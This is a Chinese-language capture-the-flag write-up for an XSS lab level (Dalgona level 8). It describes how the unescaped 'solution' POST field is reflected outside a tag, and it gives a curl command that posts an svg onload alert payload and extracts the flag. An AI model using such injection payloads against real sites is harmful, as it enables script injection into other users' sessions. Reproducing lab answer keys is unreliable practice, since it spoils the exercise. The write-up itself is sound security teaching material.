## 题解

### 入口与指纹

`Werkzeug/1.0.1` + `Python/2.7.18`，Dalgona 第 8 关（`static/css/xss/xss8.css`）。
表单 `method="post"`，字段 `solution`，反射点：

```html
<input type=text name=solution placeholder="Enter solution..." > TESTX>
```

注意：反射在**标签外部的文本节点**（`> TESTX>`），不在 `value` 里。

### 关键观察

- `GET ?name=` 不反射，必须 `POST solution=`。
- `solution` 原样输出，`<`、`>`、`"` 都没处理。

### 利用链

```bash
T=$(head -1 .target)
curl -sS -d 'solution=<svg onload=alert("XSS")>' "http://$T/page" \
| grep -o 'flag{[^}]*}'
```

### flag 位置

POST `/page` 成功响应的 `Here is the flag:` 之后。

## 复盘

- 反射点在标签外时直接写标签，不需要闭合属性。
- 字段名和 HTTP 方法要从表单读，猜错会得到「没有反射」的假象。
